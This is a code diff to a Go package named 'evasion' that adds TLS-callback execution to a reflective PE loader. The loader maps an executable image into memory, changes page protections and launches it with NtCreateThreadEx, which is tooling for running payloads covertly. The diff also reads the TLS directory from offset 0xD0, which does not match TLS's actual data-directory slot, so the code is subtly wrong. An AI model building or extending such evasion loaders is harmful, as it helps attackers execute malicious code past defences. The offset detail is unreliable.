@@ -23,6 +23,7 @@ package evasion
 import (
 	"encoding/binary"
 	"fmt"
+	"syscall"
 	"unsafe"
 
 	"golang.org/x/sys/windows"
@@ -169,6 +170,17 @@ func ReflectiveLoad(blob []byte) error {
 	NtProtectRemote(ntCurrentProcess, allocBase, uintptr(hdrSize), windows.PAGE_READONLY)
 	ntFlush(allocBase, uintptr(imgSize))
 
+	// ── TLS callbacks ─────────────────────────────────────────────────────
+	// DATA_DIRECTORY[9] = TLS (offset 0xD0 from opt header in PE32+).
+	// Execute all callbacks before the entry point (matches loader behavior).
+	const tlsDirOffset = 0xD0
+	if optBase+tlsDirOffset+8 <= len(blob) {
+		tlsRVA := binary.LittleEndian.Uint32(blob[optBase+tlsDirOffset:])
+		if tlsRVA != 0 {
+			executeTLSCallbacks(allocBase, uintptr(tlsRVA))
+		}
+	}
+
 	// ── Launch entry point ────────────────────────────────────────────────
 	ep := allocBase + uintptr(entryRVA)
 	th := NtCreateThreadEx(ntCurrentProcess, ep)
@@ -177,6 +189,29 @@ func ReflectiveLoad(blob []byte) error {
 	}
 	windows.CloseHandle(windows.Handle(th))
 	return nil
+}
+
+// executeTLSCallbacks calls each TLS callback in the loaded image before the
+// entry point, matching what ntdll!LdrpCallTlsInitializers does natively.
+// Callbacks are called with (DllBase, DLL_PROCESS_ATTACH=1, reserved=0).
+func executeTLSCallbacks(imageBase, tlsRVA uintptr) {
+	// IMAGE_TLS_DIRECTORY64:
+	//   +0x00 StartAddressOfRawData VA
+	//   +0x08 EndAddressOfRawData   VA
+	//   +0x10 AddressOfIndex        VA
+	//   +0x18 AddressOfCallBacks    VA  ← pointer to array of VAs, terminated by 0
+	cbArray := *(*uintptr)(unsafe.Pointer(imageBase + tlsRVA + 0x18))
+	if cbArray == 0 {
+		return
+	}
+	for i := uintptr(0); ; i += 8 {
+		cb := *(*uintptr)(unsafe.Pointer(cbArray + i))
+		if cb == 0 {
+			break
+		}
+		// PIMAGE_TLS_CALLBACK signature: func(DllHandle, Reason, Reserved)
+		syscall.SyscallN(cb, imageBase, 1, 0)
+	}
 }
 
 // applyRelocations processes the base relocation table at imageBase+relocRVA.
